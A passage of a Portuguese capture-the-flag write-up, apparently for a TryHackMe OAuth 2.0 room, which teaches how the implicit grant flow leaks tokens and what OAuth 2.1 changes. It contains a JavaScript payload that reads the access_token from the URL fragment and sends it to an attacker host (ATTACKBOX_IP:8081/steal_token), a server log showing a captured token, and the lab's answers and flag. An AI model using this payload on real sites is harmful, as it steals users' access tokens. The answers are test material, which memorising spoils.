+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;&amp;&#39;</span>).<span style="color:#a6e22e">reduce</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">item</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">parts</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">item</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;=&#39;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">res</span>[<span style="color:#a6e22e">parts</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">parts</span>[<span style="color:#ae81ff">1</span>]; 
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>; 
+</span></span><span style="display:flex;"><span>		}, 
+</span></span><span style="display:flex;"><span>	{}); 
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">accessToken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">access_token</span>; 
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">img</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>(); 
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">img</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://ATTACKBOX_IP:8081/steal_token?token=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">accessToken</span>; 
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<ul>
+<li>
+<p><code>window.location.hash</code> obtém a parte do URL após o <code>#</code>.</p>
+</li>
+<li>
+<p><code>substr(1)</code> remove o <code>#</code>, deixando apenas o fragmento relevante.</p>
+</li>
+<li>
+<p><code>hash.split('&amp;')</code> separa o fragmento em pares de chave-valor (ex., <code>[&quot;access_token=12345&quot;, &quot;token_type=Bearer&quot;]</code>).</p>
+</li>
+<li>
+<p><code>reduce</code> cria um objeto (<code>res</code>) onde cada chave-valor do fragmento é separado e armazenado.</p>
+</li>
+<li>
+<p>Extrai o valor do <code>access_token</code> do objeto <code>result</code>, armazenando-o na variável <code>accessToken</code>.</p>
+</li>
+<li>
+<p>Cria uma nova imagem (<code>new Image()</code>).</p>
+</li>
+<li>
+<p>Define o <code>src</code> da imagem como uma URL contendo o token de acesso.</p>
+</li>
+</ul>
+<p>O token de acesso do usuário é enviado para o atacante através da imagem, e assim o atacante obtém acesso ao recurso protegido.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>root@ip-10-10-162-175:~# python3 -m http.server 8081
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+</span></span><span style="display:flex;"><span>10.9.2.217 - - [27/Aug/2024 19:30:10] code 404, message File not found
+</span></span><span style="display:flex;"><span>10.9.2.217 - - [27/Aug/2024 19:30:10] &#34;GET /steal_token?token=2aauviER3lUOev8wNmXQ9B4GNUoadE HTTP/1.1&#34; 404 -
+</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><strong>What symbol separates the access token from the OAuth 2.0 implicit grant flow URL?</strong><br>
+Resposta:<code>#</code></p>
+<p><strong>Visit the URL <code>http://coffee.thm:8080/flagvalidator/</code> and enter the access token you acquired. What is the flag value?</strong><br>
+Resposta:<code>THM{TOKEN_HACKED}</code></p>
+<h3 data-hextra-search-id="outras-vulnerabilidades-e-evolução-do-oauth-21">Outras Vulnerabilidades e Evolução do OAuth 2.1<span class="hx:absolute hx:-mt-20" id="outras-vulnerabilidades-e-evolução-do-oauth-21"></span>
+    <a href="#outras-vulnerabilidades-e-evolu%c3%a7%c3%a3o-do-oauth-21" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Os invasores podem explorar várias outras fraquezas críticas nas implementações do OAuth 2.0. A seguir estão algumas vulnerabilidades adicionais.</p>
+<h3 data-hextra-search-id="expiração-de-token-insuficiente">Expiração de Token Insuficiente<span class="hx:absolute hx:-mt-20" id="expiração-de-token-insuficiente"></span>
+    <a href="#expira%c3%a7%c3%a3o-de-token-insuficiente" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Tokens de acesso com vidas longas ou infinitas representam um risco de segurança significativo. Se um invasor obtiver tal token, ele poderá acessar recursos protegidos indefinidamente.</p>
+<h3 data-hextra-search-id="ataques-de-repetição">Ataques de Repetição<span class="hx:absolute hx:-mt-20" id="ataques-de-repetição"></span>
+    <a href="#ataques-de-repeti%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Ataques de repetição envolvem capturar tokens válidos e reutilizá-los para obter acesso não autorizado. Os invasores podem explorar tokens várias vezes sem mecanismos para detectar e impedir a reutilização de tokens.</p>
+<h3 data-hextra-search-id="armazenamento-inseguro-de-tokens">Armazenamento Inseguro de Tokens<span class="hx:absolute hx:-mt-20" id="armazenamento-inseguro-de-tokens"></span>
+    <a href="#armazenamento-inseguro-de-tokens" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Armazenar tokens de acesso e tokens de atualização de forma insegura (por exemplo, em armazenamento local ou arquivos não criptografados) pode levar ao roubo de tokens e acesso não autorizado. Usar mecanismos de armazenamento seguros, como cookies seguros ou bancos de dados criptografados, pode proteger os tokens de serem acessados ​​por agentes maliciosos.</p>
+<h3 data-hextra-search-id="evolução-do-oauth-21">Evolução do OAuth 2.1<span class="hx:absolute hx:-mt-20" id="evolução-do-oauth-21"></span>
+    <a href="#evolu%c3%a7%c3%a3o-do-oauth-21" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>OAuth 2.1 representa a mais recente iteração na evolução do padrão OAuth, construído sobre a fundação do OAuth 2.0 para abordar suas deficiências e aumentar a segurança. A jornada do OAuth 2.0 para o OAuth 2.1 foi impulsionada pela necessidade de mitigar vulnerabilidades conhecidas e incorporar as melhores práticas que surgiram desde que a especificação original foi publicada. OAuth 2.0, embora amplamente adotado, tinha várias áreas que exigiam melhorias, particularmente em termos de segurança e interoperabilidade.</p>
+<ul>
+<li>
+<p>Uma das atualizações mais significativas é a descontinuação do tipo de concessão implícita.</p>
+</li>
+<li>
+<p>Além disso, o OAuth 2.1 exige o uso do parâmetro <code>state</code> para proteção contra ataques CSRF.</p>
+</li>
+<li>
+<p>O OAuth 2.1 também enfatiza a importância do manuseio e armazenamento seguros de tokens.</p>
+</li>
+<li>
+<p>Além disso, o OAuth 2.1 aprimora a interoperabilidade ao fornecer diretrizes mais claras para validação de URI de redirecionamento, autenticação de cliente e validação de escopo.</p>
+</li>
+</ul>
+<p><strong>Which of the following has been omitted from OAuth 2.1?</strong></p>
+<p>a) Implicit Grant<br>
+b) Authorization Code<br>
+c) Tokens<br>
+d) State</p>
+<p>Resposta:<code>a</code></p>
+<h2 data-hextra-search-id="conclusão">Conclusão<span class="hx:absolute hx:-mt-20" id="conclusão"></span>
+    <a href="#conclus%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Com isso, temos uma melhor compreensão do que é o OAuth 2.0, de seu funcionamento em diversos cenários, e também das vulnerabilidades conhecidas e frequentemente exploradas nos sistemas atuais.
+Implementações seguras de OAuth exigem atenção cuidadosa aos detalhes, como a expiração apropriada de tokens, armazenamento seguro de credenciais e uso rigoroso de parâmetros como redirect_uri e state para prevenir ataques de CSRF e hijack tokens.</p>
+
+          
+        </div>
+        <div class="hx:mt-16"></div>
+        
+        
+      </main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx:bg-gray-100 hx:pb-[env(safe-area-inset-bottom)] hx:dark:bg-neutral-900 hx:print:bg-transparent"><div class="hx:mx-auto hx:flex hx:gap-2 hx:py-2 hx:px-4 hextra-max-footer-width"><div class="hx:flex hx:justify-items-start ">
+    <button
+      title="Mudar a língua"
+      data-state="closed"
+      data-location=""
+      class="hextra-language-switcher hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:grow"
+      type="button"
+      aria-label="Mudar a língua"
+      aria-expanded="false"
+      aria-haspopup="menu"
+    >
+      <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Português</span></div>
+    </button>
+    <ul
+      class="hextra-language-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+      role="menu"
+    >
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/posts/2025/2025-02-17-oauth/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >Português<span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/en/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >English</a>
+        </li>
+      </ul>
+  </div><div class="hx:flex hx:justify-items-start hx:group" data-theme="light">
+  <button
+    title="Mudar tema"
+    data-state="closed"
+    data-location="bottom"
+    class="hextra-theme-toggle hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:grow"
+    type="button"
+    aria-label="Mudar tema"
+    aria-expanded="false"
+    aria-haspopup="menu"
+  >
+    <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden">Claro</span><svg height=12 class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden">Escuro</span><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"  fill="currentColor">
+  <path d="M 11.996094,2 C 6.4986225,2.0192368 2.03125,6.5024993 2.03125,12 c 0,5.497501 4.4673725,9.980763 9.964844,10 H 12 12.0039 c 5.497471,-0.01924 9.964844,-4.502499 9.964844,-10 0,-5.4975007 -4.467373,-9.9807632 -9.964844,-10 H 12 Z M 12,4 c 4.417218,0.017598 7.96875,3.5822356 7.96875,8 0,4.417764 -3.551532,7.982402 -7.96875,8 z" />
+</svg>
+<span class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden">Sistema</span></div>
+  </button>
+  <ul
+    class="hextra-theme-toggle-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+    style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    data-theme="light"
+    role="menu"
+  >
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="true"
+        tabindex="-1"
+        data-item="light"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Claro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="dark"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Escuro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="system"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Sistema
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+  </ul>
+</div>
+</div><hr class="hx:border-gray-200 hx:dark:border-neutral-800" /><div class="hextra-custom-footer hextra-max-footer-width hx:mx-auto hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400"></div><div
+      class="hextra-max-footer-width hx:mx-auto hx:flex hx:justify-center hx:py-12 hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400 hx:md:justify-start"
+    >
+      <div class="hx:flex hx:w-full hx:flex-col hx:items-center hx:sm:items-start"><div class="hx:font-semibold"><a class="hx:flex hx:text-sm hx:items-center hx:gap-1 hx:text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+    <span>Com a tecnologia de Hextra<svg height=1em class="hx:inline-block hx:ltr:ml-1 hx:rtl:mr-1 hx:align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
+  </a></div></div>
+    </div></footer>
+    
+    <dialog
+    id="hextra-search-dialog"
+    class="hextra-search-dialog"
+    aria-label="Procurar..."
+  >
+    <div class="hextra-search">
+      <div class="hextra-search-input-wrapper"><svg class="hextra-search-input-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg><input
+          class="hextra-search-input"
+          type="search"
+          role="combobox"
+          autocomplete="off"
+          autocorrect="off"
+          autocapitalize="off"
+          spellcheck="false"
+          placeholder="Procurar..."
+          aria-label="Procurar..."
+          aria-controls="hextra-search-results"
+          aria-expanded="false"
+        /><button
+          type="button"
+          class="hextra-search-input-kbd"
+          data-search-close
+          aria-label="Close"
+        >ESC</button>
+      </div>
+      <div class="hextra-search-results-viewport" data-search-viewport>
+        <div class="hextra-search-results-inner hextra-scrollbar" data-search-inner>
+          <ul
+            id="hextra-search-results"
+            class="hextra-search-results"
+            role="listbox"
+            aria-label="Resultados da pesquisa"
+          ></ul>
+          <div class="hextra-search-empty" data-search-empty hidden>Nenhum resultado encontrado</div>
+        </div>
+      </div>
+      <div class="hextra-search-status hx:sr-only" aria-live="polite" role="status"></div>
+    </div>
+  </dialog>
+    <script defer src="/js/main.js" integrity=""></script>
+<script defer src="/js/flexsearch.9f5b5908f93ae86f1ecd4b043b799f580c2d1654e703dd9357d568ac41b2547a.js" integrity="sha256-n1tZCPk66G8ezUsEO3mfWAwtFlTnA92TV9VorEGyVHo=" crossorigin="anonymous"></script><script defer src="/pt.search.js" integrity=""></script>
+    <script defer src="/pt.search-dialog.js" integrity=""></script>
+  </body>
+</html>
